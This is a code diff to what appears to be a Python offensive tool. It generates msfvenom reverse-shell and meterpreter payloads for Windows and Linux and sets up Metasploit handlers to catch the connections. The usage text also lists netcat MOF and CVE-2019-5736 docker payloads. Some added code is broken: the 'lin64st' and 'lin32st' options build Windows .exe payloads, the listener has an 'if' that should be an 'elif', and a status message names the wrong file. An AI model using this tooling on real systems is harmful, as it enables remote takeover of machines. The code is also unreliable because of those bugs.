@@ -34,6 +34,9 @@ import binascii
 import urllib as ul
 import netifaces as ni
 
+# Make output more verbose
+VERBOSE = True
+
 # Handler to exist cleanly on ctrl+C
 def signal_handler(signal, frame):
     print "\nYou pressed Ctrl+C!"
@@ -194,16 +197,35 @@ select((select($FH), $|=1)[0]);
 
 def msfvenom(type, lhost, lport):
 
-    if type == 'win64':
-        command = "msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
+    if type == 'win64m':
+        command = "msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
+    elif type == 'win32m':
+        command = "msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
+    elif type == 'lin64m' or type == 'mperl64m':
+        command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_%s" % (lhost, lport, type, lport)
+    elif type == 'lin32m' or type == 'mperl32m':
+        command = "msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_%s" % (lhost, lport, type, lport)
+    elif type == 'win64':
+        command = "msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
     elif type == 'win32':
-        command = "msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
+        command = "msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
     elif type == 'lin64' or type == 'mperl64':
-        command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
+        command = "msfvenom --platform linux -a x64 -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_%s" % (lhost, lport, type, lport)
     elif type == 'lin32' or type == 'mperl32':
-        command = "msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
+        command = "msfvenom --platform linux -a x86 -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_%s" % (lhost, lport, type, lport)
+    elif type == 'win64st':
+        command = "msfvenom --platform windows -a x64 -p windows/x64/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
+    elif type == 'win32st':
+        command = "msfvenom --platform windows -a x86 -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
+    elif type == 'lin64st':
+        command = "msfvenom --platform linux -a x64 -p windows/x64/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
+    elif type == 'lin32st':
+        command = "msfvenom --platform linux -a x86 -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_%s.exe" % (lhost, lport, type, lport)
     else:
         print_usage()
+
+    if VERBOSE is True:
+        print("[+] %s" % command)
 
     os.system(command)
     print("[+] Saved %s_payload" % type)
@@ -216,14 +238,30 @@ def listener(type, lhost, lport):
 
     payload = "use exploit/multi/handler\n"
 
-    if type == 'win64s':
+    if type == 'win64ms':
         payload += "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
-    elif type == 'win32s':
+    elif type == 'win32ms':
         payload += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
-    elif type == 'lin64s':
+    elif type == 'lin64ms':
         payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
-    elif type == 'lin32s':
+    elif type == 'lin32ms':
         payload += "set PAYLOAD linux/x86/meterpreter/reverse_tcp\n"
+    elif type == 'win64s':
+        payload += "set PAYLOAD windows/x64/shell_reverse_tcp\n"
+    elif type == 'win32s':
+        payload += "set PAYLOAD windows/shell_reverse_tcp\n"
+    elif type == 'lin64s':
+        payload += "set PAYLOAD linux/x64/shell_reverse_tcp\n"
+    elif type == 'lin32s':
+        payload += "set PAYLOAD linux/x86/shell_reverse_tcp\n"
+    if type == 'win64ts':
+        payload += "set PAYLOAD windows/x64/shell/reverse_tcp\n"
+    elif type == 'win32ts':
+        payload += "set PAYLOAD windows/shell/reverse_tcp\n"
+    elif type == 'lin64ts':
+        payload += "set PAYLOAD linux/x64/shell/reverse_tcp\n"
+    elif type == 'lin32ts':
+        payload += "set PAYLOAD linux/x86/shell/reverse_tcp\n"
     else:
         print_usage()
 
@@ -525,10 +563,18 @@ Simplifies payload creation and listener.
 
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
-    win64    <LHOST> <LPORT>  |   x64 Windows payload
-    win32    <LHOST> <LPORT>  |   x32 Windows payload
-    lin64    <LHOST> <LPORT>  |   x64 Linux payload
-    lin32    <LHOST> <LPORT>  |   x32 Linux payload
+    win64m   <LHOST> <LPORT>  |   x64 Windows meterpreter payload
+    win32m   <LHOST> <LPORT>  |   x32 Windows meterpreter payload
+    lin64m   <LHOST> <LPORT>  |   x64 Linux meterpreter payload
+    lin32m   <LHOST> <LPORT>  |   x32 Linux meterpreter payload
+    win64    <LHOST> <LPORT>  |   x64 Windows stageless payload
+    win32    <LHOST> <LPORT>  |   x32 Windows stageless payload
+    lin64    <LHOST> <LPORT>  |   x64 Linux stageless payload
+    lin32    <LHOST> <LPORT>  |   x32 Linux stageless payload    
+    win64st  <LHOST> <LPORT>  |   x64 Windows staged payload
+    win32st  <LHOST> <LPORT>  |   x32 Windows staged payload    
+    lin64st  <LHOST> <LPORT>  |   x64 Linux staged payload
+    lin32st  <LHOST> <LPORT>  |   x32 Linux staged payload      
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
     mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
     dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
@@ -569,12 +615,20 @@ Simplifies payload creation and listener.
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
-    win64s   <LHOST> <LPORT>  |   x64 Windows meterpreter listen
-    win32s   <LHOST> <LPORT>  |   x32 Windows meterpreter listen
-    lin64s   <LHOST> <LPORT>  |   x64 Linux meterpreter listen
-    lin32s   <LHOST> <LPORT>  |   x32 Linux meterpreter listen
-    pythons  <LHOST> <LPORT>  |   python listener
-    ncs      <LHOST> <LPORT>  |   netcat listener
+    win64ms   <LHOST> <LPORT> |   x64 Windows meterpreter listen
+    win32ms   <LHOST> <LPORT> |   x32 Windows meterpreter listen
+    lin64ms   <LHOST> <LPORT> |   x64 Linux meterpreter listen
+    lin32ms   <LHOST> <LPORT> |   x32 Linux meterpreter listen
+    win64s    <LHOST> <LPORT> |   x64 Windows stageless listen
+    win32s    <LHOST> <LPORT> |   x32 Windows stageless listen
+    lin64s    <LHOST> <LPORT> |   x64 Linux stageless listen
+    lin32s    <LHOST> <LPORT> |   x32 Linux stageless listen    
+    win64ts   <LHOST> <LPORT> |   x64 Windows staged listen
+    win32ts   <LHOST> <LPORT> |   x32 Windows staged listen
+    lin64ts   <LHOST> <LPORT> |   x64 Linux staged listen
+    lin32ts   <LHOST> <LPORT> |   x32 Linux staged listen    
+    pythons   <LHOST> <LPORT> |   python listener
+    ncs       <LHOST> <LPORT> |   netcat listener
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Advanced]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
